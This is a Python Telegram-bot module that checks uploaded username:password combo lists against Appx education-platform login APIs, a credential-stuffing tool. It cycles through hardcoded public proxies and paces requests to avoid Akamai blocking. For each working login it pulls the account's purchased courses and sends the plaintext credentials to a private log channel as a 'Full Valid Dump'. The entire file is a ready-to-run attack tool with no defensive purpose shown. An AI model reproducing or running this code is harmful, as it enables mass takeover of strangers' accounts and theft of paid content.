import asyncio
import requests
import uuid
import random
from Extractor import app
from pyrogram import filters
from asyncio import Lock
from config import PREMIUM_LOGS

# ================= CONFIG =================
LOG_CHANNEL_ID = PREMIUM_LOGS

SEM = asyncio.Semaphore(1)          # one account at a time (Akamai safe)
REQUEST_DELAY = 3.0                # delay after each account
LOG_DELAY = 5.0                    # delay before log send
PROGRESS_UPDATE_EVERY = 50

# ================= PROXIES (ALIVE ONLY) =================
PROXIES = [
    "http://47.92.242.45:6969",
    "socks5://72.195.114.169:4145",
    "http://8.209.249.96:3128",
    "http://81.143.236.200:443",
    "http://139.196.214.238:1234",
    "http://47.109.56.77:5566",
    "socks5://199.102.107.145:4145",
    "socks5://72.195.114.184:4145",
    "socks5://174.77.111.196:4145",
    "http://49.0.246.130:45554",
    "socks5://192.111.139.162:4145",
    "http://8.209.253.237:80",
    "http://188.191.164.55:4890",
    "http://70.166.167.55:57745",
    "socks5://192.111.138.29:4145",
]

proxy_stats = {
    p: {
        "total": 0,
        "success": 0,
        "blocked": 0,
        "failed": 0,
        "disabled": False
    }
    for p in PROXIES
}

proxy_lock = Lock()

# ================= GLOBAL STATE =================
stats = {
    "checked": 0,
    "valid": 0,
    "invalid": 0,
    "blocked": 0,
    "total": 0
}

stats_lock = Lock()
results = []

# ================= HELPERS =================
def post_request(url, headers, data, proxy=None):
    return requests.post(
        url,
        headers=headers,
        data=data,
        timeout=20,
        proxies=proxy
    )

def get_request(url, headers, proxy=None):
    return requests.get(
        url,
        headers=headers,
        timeout=20,
        proxies=proxy
    )

def extract_api_name(api: str) -> str:
    api = api.replace("https://", "").replace("http://", "")
    return api.split(".")[0]

def progress_bar(done, total):
    if total == 0:
        return "💻 Progress : 0%"
    return f"💻 Progress : {int((done / total) * 100)}%"

async def safe_edit(msg, text):
    try:
        await msg.edit_text(text)
    except:
        pass

def get_best_proxy():
    active = [(p, s) for p, s in proxy_stats.items() if not s["disabled"]]
    if not active:
        return None

    def score(item):
        p, s = item
        if s["total"] == 0:
            return 1.0
        return s["success"] / s["total"]

    active.sort(key=score, reverse=True)
    return active[0][0]

# ================= CORE FUNCTION =================
async def login_and_get_courses(n, p, api, bot, progress_msg):
    async with SEM:
        is_valid = False
        print(f"[START] {n}")

        proxy_url = get_best_proxy()
        proxy = {"http": proxy_url, "https": proxy_url} if proxy_url else None
        print(f"[PROXY] {n} -> {proxy_url}")

        h = {
            "client-service": "Appx",
            "auth-key": "appxapi",
            "language": "en",
            "device_type": "ANDROID",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "okhttp/4.9.1",
            "source": "website"
        }

        d = {
            "email": n,
            "password": p,
            "devicetoken": "",
            "mydeviceid": uuid.uuid4().hex[:16]
        }

        loop = asyncio.get_running_loop()

        if proxy_url:
            async with proxy_lock:
                proxy_stats[proxy_url]["total"] += 1

        # -------- LOGIN --------
        try:
            r1 = await loop.run_in_executor(
                None,
                post_request,
                f"https://{api}/post/userLogin",
                h,
                d,
                proxy
            )
        except Exception as e:
            print(f"[LOGIN-FAIL] {n} -> {e}")
            if proxy_url:
                async with proxy_lock:
                    proxy_stats[proxy_url]["failed"] += 1
            async with stats_lock:
                stats["blocked"] += 1
            return

        text = r1.text.strip()
        if r1.status_code != 200 or not text.startswith("{"):
            print(f"[LOGIN-BLOCKED] {n} status={r1.status_code}")
            if proxy_url:
                async with proxy_lock:
                    proxy_stats[proxy_url]["blocked"] += 1
                    rate = proxy_stats[proxy_url]["success"] / max(1, proxy_stats[proxy_url]["total"])
                    if rate < 0.3:
                        proxy_stats[proxy_url]["disabled"] = True
                        print(f"[PROXY-DISABLED] {proxy_url}")
            async with stats_lock:
                stats["blocked"] += 1
            return

        r1 = r1.json()
        data = r1.get("data", {})
        token = data.get("token")
        user_id = data.get("userid")

        if not token or not user_id:
            async with stats_lock:
                stats["invalid"] += 1
                stats["checked"] += 1
            return

        h.update({
            "Authorization": token,
            "User-ID": user_id
        })

        # -------- COURSES (RETRY) --------
        for _ in range(3):
            try:
                r2 = await loop.run_in_executor(
                    None,
                    get_request,
                    f"https://{api}/get/mycourseweb?userid={user_id}",
                    h,
                    proxy
                )
                r2 = r2.json()
            except:
                await asyncio.sleep(1.5)
                continue

            courses = r2.get("data")
            if isinstance(courses, list) and courses:
                batches = [
                    i.get("course_name")
                    for i in courses
                    if isinstance(i, dict) and i.get("course_name")
                ]
                if batches:
                    is_valid = True

                    success_text = (
                        f"👤 Account: `{n}*{p}`\n\n"
                        f"📚 Total Batches: {len(batches)}\n\n"
                    )
                    for b in batches:
                        success_text += f"🪪 {b}\n"

                    await asyncio.sleep(LOG_DELAY)
                    await bot.send_message(LOG_CHANNEL_ID, success_text)
                    results.append(success_text)

                    if proxy_url:
                        async with proxy_lock:
                            proxy_stats[proxy_url]["success"] += 1
                    break
            await asyncio.sleep(1.5)

        async with stats_lock:
            stats["checked"] += 1
            if is_valid:
                stats["valid"] += 1
            else:
                stats["invalid"] += 1

            checked = stats["checked"]
            valid = stats["valid"]
            invalid = stats["invalid"]
            blocked = stats["blocked"]
            total = stats["total"]

        if checked % PROGRESS_UPDATE_EVERY == 0 or checked == total:
            asyncio.create_task(
                safe_edit(
                    progress_msg,
                    f"{progress_bar(checked, total)}\n\n"
                    f"⚙️ Checked : {checked}\n"
                    f"📊 Valid   : {valid}\n"
                    f"❌ Invalid : {invalid}\n"
                    f"🚫 Blocked : {blocked}\n"
                    f"💾 Left    : {total - checked}"
                )
            )

        print(f"[END] {n} valid={is_valid}")
        await asyncio.sleep(REQUEST_DELAY + random.uniform(0.5, 1.0))

# ================= COMMAND =================
@app.on_message(filters.command("babe"))
async def pw_command_handler(bot, m):
    cfile = await bot.ask(
        m.chat.id,
        "📄 Upload credential file (`username:password` per line)"
    )

    file_path = await bot.download_media(cfile.document.file_id)

    appx = await bot.ask(
        m.chat.id,
        "🌐 Enter Appx API domain (without https://)"
    )
    api = appx.text.strip()

    with open(file_path, "r") as f:
        lines = [i.strip() for i in f if ":" in i]

    stats.update({
        "total": len(lines),
        "checked": 0,
        "valid": 0,
        "invalid": 0,
        "blocked": 0
    })
    results.clear()

    progress_msg = await m.reply_text(
        f"{progress_bar(0, stats['total'])}\n\n"
        f"⚙️ Checked : 0\n"
        f"📊 Valid   : 0\n"
        f"❌ Invalid : 0\n"
        f"🚫 Blocked : 0\n"
        f"💾 Left    : {stats['total']}"
    )

    tasks = [
        login_and_get_courses(*line.split(":", 1), api, bot, progress_msg)
        for line in lines
    ]

    await asyncio.gather(*tasks)

    # -------- FINAL TXT --------
    api_name = extract_api_name(api)
    txt_path = f"valid_{api_name}.txt"

    if results:
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write("\n\n".join(results))

        await m.reply_document(txt_path, caption="📄 Final Valid Results")
        await bot.send_document(LOG_CHANNEL_ID, txt_path, caption="📄 Full Valid Dump")

    # -------- PROXY REPORT --------
    report = "🌐 Proxy Health Report\n\n"
    for p, s in proxy_stats.items():
        if s["total"] == 0:
            continue
        rate = (s["success"] / s["total"]) * 100
        report += (
            f"{p}\n"
            f"  Total   : {s['total']}\n"
            f"  Success : {s['success']}\n"
            f"  Blocked : {s['blocked']}\n"
            f"  Failed  : {s['failed']}\n"
            f"  Rate    : {rate:.1f}%\n"
            f"  Status  : {'❌ DISABLED' if s['disabled'] else '✅ ACTIVE'}\n\n"
        )

    await m.reply_text(report[:4096])
